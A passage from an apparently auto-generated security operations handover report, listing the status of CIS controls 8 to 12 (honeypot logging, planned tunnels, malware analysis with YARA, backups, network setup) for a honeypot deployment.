| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-03T23:09:13Z_
